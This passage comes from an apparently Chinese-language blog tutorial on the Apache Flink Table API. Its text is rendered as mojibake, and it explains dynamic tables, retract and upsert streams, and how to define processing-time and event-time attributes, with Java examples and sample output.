æµè¢«è½¬æ¢ä¸ºåŠ¨æ€è¡¨ </li><li> å¯¹åŠ¨æ€è¡¨è®¡ç®—è¿ç»­æŸ¥è¯¢ï¼Œç”Ÿæˆæ–°çš„åŠ¨æ€è¡¨ </li><li> ç”Ÿæˆçš„åŠ¨æ€è¡¨è¢«è½¬æ¢å›æµ </li></ol><h5 id="å°†æµè½¬æ¢æˆåŠ¨æ€è¡¨"><a href="#å°†æµè½¬æ¢æˆåŠ¨æ€è¡¨" class="headerlink" title="å°†æµè½¬æ¢æˆåŠ¨æ€è¡¨"></a>å°†æµè½¬æ¢æˆåŠ¨æ€è¡¨</h5><ul><li>ä¸ºäº†å¤„ç†å¸¦æœ‰å…³ç³»æŸ¥è¯¢çš„æµï¼Œå¿…é¡»å…ˆå°†å…¶è½¬æ¢ä¸ºè¡¨</li><li>ä»æ¦‚å¿µä¸Šè®²ï¼Œæµçš„æ¯ä¸ªæ•°æ®è®°å½•ï¼Œéƒ½è¢«è§£é‡Šä¸ºå¯¹ç»“æœè¡¨çš„æ’å…¥ï¼ˆInsertï¼‰ä¿®æ”¹æ“ä½œ</li></ul><p><em>æœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬å…¶å®æ˜¯ä»ä¸€ä¸ªã€åªæœ‰æ’å…¥æ“ä½œçš„changelogï¼ˆæ›´æ–°æ—¥å¿—ï¼‰æµï¼Œæ¥æ„å»ºä¸€ä¸ªè¡¨</em></p><p><em>æ¥ä¸€æ¡æ•°æ®æ’å…¥ä¸€æ¡æ•°æ®</em></p><p><img src="https://img-blog.csdnimg.cn/20200601191016684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=zsFJJ&originHeight=257&originWidth=707&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="æŒç»­æŸ¥è¯¢"><a href="#æŒç»­æŸ¥è¯¢" class="headerlink" title="æŒç»­æŸ¥è¯¢"></a>æŒç»­æŸ¥è¯¢</h5><ul><li> æŒç»­æŸ¥è¯¢ï¼Œä¼šåœ¨åŠ¨æ€è¡¨ä¸Šåšè®¡ç®—å¤„ç†ï¼Œå¹¶ä½œä¸ºç»“æœç”Ÿæˆæ–°çš„åŠ¨æ€è¡¨ã€‚<br><em>ä¸æ‰¹å¤„ç†æŸ¥è¯¢ä¸åŒï¼Œè¿ç»­æŸ¥è¯¢ä»ä¸ç»ˆæ­¢ï¼Œå¹¶æ ¹æ®è¾“å…¥è¡¨ä¸Šçš„æ›´æ–°æ›´æ–°å…¶ç»“æœè¡¨ã€‚</em><br><em>åœ¨ä»»ä½•æ—¶é—´ç‚¹ï¼Œè¿ç»­æŸ¥è¯¢çš„ç»“æœåœ¨è¯­ä¹‰ä¸Šï¼Œç­‰åŒäºåœ¨è¾“å…¥è¡¨çš„å¿«ç…§ä¸Šï¼Œä»¥æ‰¹å¤„ç†æ¨¡å¼æ‰§è¡Œçš„åŒä¸€æŸ¥è¯¢çš„ç»“æœã€‚</em> </li></ul><pre><code>ä¸‹å›¾ä¸ºä¸€ä¸ªç‚¹å‡»äº‹ä»¶æµçš„æŒç»­æŸ¥è¯¢ï¼Œæ˜¯ä¸€ä¸ªåˆ†ç»„èšåˆåšcountç»Ÿè®¡çš„æŸ¥è¯¢ã€‚</code></pre><p><img src="https://img-blog.csdnimg.cn/20200601191112183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=ogdlp&originHeight=349&originWidth=673&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="å°†åŠ¨æ€è¡¨è½¬æ¢æˆ-DataStream"><a href="#å°†åŠ¨æ€è¡¨è½¬æ¢æˆ-DataStream" class="headerlink" title="å°†åŠ¨æ€è¡¨è½¬æ¢æˆ DataStream"></a>å°†åŠ¨æ€è¡¨è½¬æ¢æˆ DataStream</h5><ul><li>ä¸å¸¸è§„çš„æ•°æ®åº“è¡¨ä¸€æ ·ï¼ŒåŠ¨æ€è¡¨å¯ä»¥é€šè¿‡æ’å…¥ï¼ˆInsertï¼‰ã€æ›´æ–°ï¼ˆUpdateï¼‰å’Œåˆ é™¤ï¼ˆDeleteï¼‰æ›´æ”¹ï¼Œè¿›è¡ŒæŒç»­çš„ä¿®æ”¹</li><li><strong>å°†åŠ¨æ€è¡¨è½¬æ¢ä¸ºæµæˆ–å°†å…¶å†™å…¥å¤–éƒ¨ç³»ç»Ÿæ—¶ï¼Œéœ€è¦å¯¹è¿™äº›æ›´æ”¹è¿›è¡Œç¼–ç </strong></li></ul><hr><ul><li>ä»…è¿½åŠ ï¼ˆAppend-onlyï¼‰æµ <ul><li>ä»…é€šè¿‡æ’å…¥ï¼ˆInsertï¼‰æ›´æ”¹æ¥ä¿®æ”¹çš„åŠ¨æ€è¡¨ï¼Œå¯ä»¥ç›´æ¥è½¬æ¢ä¸ºä»…è¿½åŠ æµ</li></ul></li><li>æ’¤å›ï¼ˆRetractï¼‰æµ <ul><li> æ’¤å›æµæ˜¯åŒ…å«ä¸¤ç±»æ¶ˆæ¯çš„æµï¼šæ·»åŠ ï¼ˆAddï¼‰æ¶ˆæ¯å’Œæ’¤å›ï¼ˆRetractï¼‰æ¶ˆæ¯<br><em>åŠ¨æ€è¡¨é€šè¿‡å°†INSERT ç¼–ç ä¸ºaddæ¶ˆæ¯ã€DELETE ç¼–ç ä¸ºretractæ¶ˆæ¯ã€UPDATEç¼–ç ä¸ºè¢«æ›´æ”¹è¡Œï¼ˆå‰ä¸€è¡Œï¼‰çš„retractæ¶ˆæ¯å’Œæ›´æ–°åè¡Œï¼ˆæ–°è¡Œï¼‰çš„addæ¶ˆæ¯ï¼Œè½¬æ¢ä¸ºretractæµã€‚</em> </li></ul></li><li>Upsertï¼ˆæ›´æ–°æ’å…¥æµï¼‰ <ul><li> Upsertæµä¹ŸåŒ…å«ä¸¤ç§ç±»å‹çš„æ¶ˆæ¯ï¼šUpsertæ¶ˆæ¯å’Œåˆ é™¤ï¼ˆDeleteï¼‰æ¶ˆæ¯<br><em>é€šè¿‡å°†INSERTå’ŒUPDATEæ›´æ”¹ç¼–ç ä¸ºupsertæ¶ˆæ¯ï¼Œå°†DELETEæ›´æ”¹ç¼–ç ä¸ºDELETEæ¶ˆæ¯ï¼Œå°±å¯ä»¥å°†å…·æœ‰å”¯ä¸€é”®ï¼ˆUnique Keyï¼‰çš„åŠ¨æ€è¡¨è½¬æ¢ä¸ºæµã€‚</em> </li></ul></li></ul><h5 id="å°†åŠ¨æ€è¡¨è½¬æ¢æˆDataStream"><a href="#å°†åŠ¨æ€è¡¨è½¬æ¢æˆDataStream" class="headerlink" title="å°†åŠ¨æ€è¡¨è½¬æ¢æˆDataStream"></a>å°†åŠ¨æ€è¡¨è½¬æ¢æˆDataStream</h5><p><img src="https://img-blog.csdnimg.cn/20200601191549610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=oG4SE&originHeight=492&originWidth=875&originalType=binary&ratio=1&status=done&style=none"></p><h3 id="æ—¶é—´ç‰¹æ€§-Time-Attributes"><a href="#æ—¶é—´ç‰¹æ€§-Time-Attributes" class="headerlink" title="æ—¶é—´ç‰¹æ€§(Time Attributes)"></a>æ—¶é—´ç‰¹æ€§(Time Attributes)</h3><h4 id="æ¦‚è¿°-6"><a href="#æ¦‚è¿°-6" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><ul><li>åŸºäºæ—¶é—´çš„æ“ä½œï¼ˆæ¯”å¦‚ Table API å’Œ SQL ä¸­çª—å£æ“ä½œï¼‰ï¼Œéœ€è¦å®šä¹‰ç›¸å…³çš„æ—¶é—´è¯­ä¹‰å’Œæ—¶é—´æ•°æ®æ¥æºçš„ä¿¡æ¯</li><li>Table å¯ä»¥æä¾›ä¸€ä¸ªé€»è¾‘ä¸Šçš„æ—¶é—´å­—æ®µï¼Œç”¨äºåœ¨è¡¨å¤„ç†ç¨‹åºä¸­ï¼ŒæŒ‡ç¤ºæ—¶é—´å’Œè®¿é—®ç›¸åº”çš„æ—¶é—´æˆ³</li><li><strong>æ—¶é—´å±æ€§ï¼Œå¯ä»¥æ˜¯æ¯ä¸ªè¡¨schemaçš„ä¸€éƒ¨åˆ†ã€‚ä¸€æ—¦å®šä¹‰äº†æ—¶é—´å±æ€§ï¼Œå®ƒå°±å¯ä»¥ä½œä¸ºä¸€ä¸ªå­—æ®µå¼•ç”¨ï¼Œå¹¶ä¸”å¯ä»¥åœ¨åŸºäºæ—¶é—´çš„æ“ä½œä¸­ä½¿ç”¨</strong></li><li>æ—¶é—´å±æ€§çš„è¡Œä¸ºç±»ä¼¼äºå¸¸è§„æ—¶é—´æˆ³ï¼Œå¯ä»¥è®¿é—®ï¼Œå¹¶ä¸”è¿›è¡Œè®¡ç®—</li></ul><h4 id="å®šä¹‰å¤„ç†æ—¶é—´-Processing-Time"><a href="#å®šä¹‰å¤„ç†æ—¶é—´-Processing-Time" class="headerlink" title="å®šä¹‰å¤„ç†æ—¶é—´(Processing Time)"></a>å®šä¹‰å¤„ç†æ—¶é—´(Processing Time)</h4><ul><li>å¤„ç†æ—¶é—´è¯­ä¹‰ä¸‹ï¼Œå…è®¸è¡¨å¤„ç†ç¨‹åºæ ¹æ®æœºå™¨çš„æœ¬åœ°æ—¶é—´ç”Ÿæˆç»“æœã€‚å®ƒæ˜¯æ—¶é—´çš„æœ€ç®€å•æ¦‚å¿µã€‚å®ƒæ—¢ä¸éœ€è¦æå–æ—¶é—´æˆ³ï¼Œä¹Ÿä¸éœ€è¦ç”Ÿæˆ watermark</li></ul><h5 id="ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š"><a href="#ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š" class="headerlink" title="ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š"></a>ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š</h5><ul><li> åœ¨å®šä¹‰ Table Schema æœŸé—´ï¼Œå¯ä»¥ä½¿ç”¨<code>.proctime</code>ï¼ŒæŒ‡å®šå­—æ®µåå®šä¹‰å¤„ç†æ—¶é—´å­—æ®µ </li><li> <strong>è¿™ä¸ªproctimeå±æ€§åªèƒ½é€šè¿‡é™„åŠ é€»è¾‘å­—æ®µï¼Œæ¥æ‰©å±•ç‰©ç†schemaã€‚å› æ­¤ï¼Œåªèƒ½åœ¨schemaå®šä¹‰çš„æœ«å°¾å®šä¹‰å®ƒ</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                           <span class="string">&quot;id, temperature, pt.proctime&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="å®šä¹‰Table-Schemaæ—¶æŒ‡å®š"><a href="#å®šä¹‰Table-Schemaæ—¶æŒ‡å®š" class="headerlink" title="å®šä¹‰Table Schemaæ—¶æŒ‡å®š"></a>å®šä¹‰Table Schemaæ—¶æŒ‡å®š</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">            .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">            .field(<span class="string">&quot;timestamp&quot;</span>,DataTypes.BIGINT())</span><br><span class="line">            .field(<span class="string">&quot;temperature&quot;</span>,DataTypes.DOUBLE())</span><br><span class="line">            .field(<span class="string">&quot;pt&quot;</span>,DataTypes.TIMESTAMP(<span class="number">3</span>))</span><br><span class="line">            .proctime()</span><br><span class="line">           )</span><br></pre></td></tr></table></figure><h5 id="åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰"><a href="#åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰" class="headerlink" title="åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰"></a>åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String sinkDDL = </span><br><span class="line">  <span class="string">&quot;create table dataTable (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; id varchar(20) not null, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; ts bigint, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; temperature double, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; pt AS PROCTIME() &quot;</span> +</span><br><span class="line">  <span class="string">&quot; ) with (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.type&#x27; = &#x27;filesystem&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.path&#x27; = &#x27;/sensor.txt&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;format.type&#x27; = &#x27;csv&#x27;)&quot;</span>;</span><br><span class="line">tableEnv.sqlUpdate(sinkDDL);</span><br></pre></td></tr></table></figure><h5 id="æµ‹è¯•ä»£ç -7"><a href="#æµ‹è¯•ä»£ç -7" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¯»å…¥æ–‡ä»¶æ•°æ®ï¼Œå¾—åˆ°DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å°†æµè½¬æ¢æˆè¡¨ï¼Œå®šä¹‰æ—¶é—´ç‰¹æ€§</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dataTable.printSchema();</span><br><span class="line">    tableEnv.toAppendStream(dataTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- ts: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> |-- pt: TIMESTAMP(3) *PROCTIME*</span><br><span class="line"></span><br><span class="line">sensor_1,1547718199,35.8,2021-02-03T16:50:58.048</span><br><span class="line">sensor_6,1547718201,15.4,2021-02-03T16:50:58.048</span><br><span class="line">sensor_7,1547718202,6.7,2021-02-03T16:50:58.050</span><br><span class="line">sensor_10,1547718205,38.1,2021-02-03T16:50:58.050</span><br><span class="line">sensor_1,1547718207,36.3,2021-02-03T16:50:58.051</span><br><span class="line">sensor_1,1547718209,32.8,2021-02-03T16:50:58.051</span><br><span class="line">sensor_1,1547718212,37.1,2021-02-03T16:50:58.051</span><br></pre></td></tr></table></figure><h4 id="å®šä¹‰äº‹ä»¶äº‹ä»¶-Event-Time"><a href="#å®šä¹‰äº‹ä»¶äº‹ä»¶-Event-Time" class="headerlink" title="å®šä¹‰äº‹ä»¶äº‹ä»¶(Event Time)"></a>å®šä¹‰äº‹ä»¶äº‹ä»¶(Event Time)</h4><ul><li>äº‹ä»¶æ—¶é—´è¯­ä¹‰ï¼Œå…è®¸è¡¨å¤„ç†ç¨‹åºæ ¹æ®æ¯ä¸ªè®°å½•ä¸­åŒ…å«çš„æ—¶é—´ç”Ÿæˆç»“æœã€‚è¿™æ ·å³ä½¿åœ¨æœ‰ä¹±åºäº‹ä»¶æˆ–è€…å»¶è¿Ÿäº‹ä»¶æ—¶ï¼Œä¹Ÿå¯ä»¥è·å¾—æ­£ç¡®çš„ç»“æœã€‚</li><li><strong>ä¸ºäº†å¤„ç†æ— åºäº‹ä»¶ï¼Œå¹¶åŒºåˆ†æµä¸­çš„å‡†æ—¶å’Œè¿Ÿåˆ°äº‹ä»¶ï¼›Flinkéœ€è¦ä»äº‹ä»¶æ•°æ®ä¸­ï¼Œæå–æ—¶é—´æˆ³ï¼Œå¹¶ç”¨æ¥æ¨é€äº‹ä»¶æ—¶é—´çš„è¿›å±•</strong></li><li>å®šä¹‰äº‹ä»¶äº‹ä»¶ï¼ŒåŒæ ·æœ‰ä¸‰ç§æ–¹æ³•ï¼š <ul><li>ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š</li><li>å®šä¹‰Table Schemaæ—¶æŒ‡å®š</li><li>åœ¨åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰</li></ul></li></ul><h5 id="ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š-1"><a href="#ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š-1" class="headerlink" title="ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š"></a>ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®š</h5><ul><li> ç”±DataStreamè½¬æ¢æˆè¡¨æ—¶æŒ‡å®šï¼ˆæ¨èï¼‰ </li><li> åœ¨DataStreamè½¬æ¢æˆTableï¼Œä½¿ç”¨<code>.rowtime</code>å¯ä»¥å®šä¹‰äº‹ä»¶äº‹ä»¶å±æ€§  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†DataStreamè½¬æ¢ä¸ºTableï¼Œå¹¶æŒ‡å®šæ—¶é—´å­—æ®µ</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                           <span class="string">&quot;id, timestamp.rowtime, temperature&quot;</span>);</span><br><span class="line"><span class="comment">// æˆ–è€…ï¼Œç›´æ¥è¿½åŠ æ—¶é—´å­—æ®µ</span></span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                          <span class="string">&quot;id, temperature, timestamp, rt.rowtime&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="å®šä¹‰Table-Schemaæ—¶æŒ‡å®š-1"><a href="#å®šä¹‰Table-Schemaæ—¶æŒ‡å®š-1" class="headerlink" title="å®šä¹‰Table Schemaæ—¶æŒ‡å®š"></a>å®šä¹‰Table Schemaæ—¶æŒ‡å®š</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">            .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">            .field(<span class="string">&quot;timestamp&quot;</span>,DataTypes.BIGINT())</span><br><span class="line">            .rowtime(</span><br><span class="line">              <span class="keyword">new</span> Rowtime()</span><br><span class="line">              .timestampsFromField(<span class="string">&quot;timestamp&quot;</span>) <span class="comment">// ä»å­—æ®µä¸­æå–æ—¶é—´æˆ³</span></span><br><span class="line">              .watermarksPeriodicBounded(<span class="number">1000</span>) <span class="comment">// watermarkå»¶è¿Ÿ1ç§’</span></span><br><span class="line">            )</span><br><span class="line">            .field(<span class="string">&quot;temperature&quot;</span>,DataTypes.DOUBLE())</span><br><span class="line">           )</span><br></pre></td></tr></table></figure><h5 id="åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰-1"><a href="#åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰-1" class="headerlink" title="åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰"></a>åˆ›å»ºè¡¨çš„DDLä¸­å®šä¹‰</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String sinkDDL = </span><br><span class="line">  <span class="string">&quot;create table dataTable (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; id varchar(20) not null, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; ts bigint, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; temperature double, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; rt AS TO_TIMESTAMP( FROM_UNIXTIME(ts) ), &quot;</span> +</span><br><span class="line">  <span class="string">&quot; watermark for rt as rt - interval &#x27;1&#x27; second&quot;</span></span><br><span class="line">  <span class="string">&quot; ) with (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.type&#x27; = &#x27;filesystem&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.path&#x27; = &#x27;/sensor.txt&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;format.type&#x27; = &#x27;csv&#x27;)&quot;</span>;</span><br><span class="line">tableEnv.sqlUpdate(sinkDDL);</span><br></pre></td></tr></table></figure><h5 id="æµ‹è¯•ä»£ç -8"><a href="#æµ‹è¯•ä»£ç -8" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¯»å…¥æ–‡ä»¶æ•°æ®ï¼Œå¾—åˆ°DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span 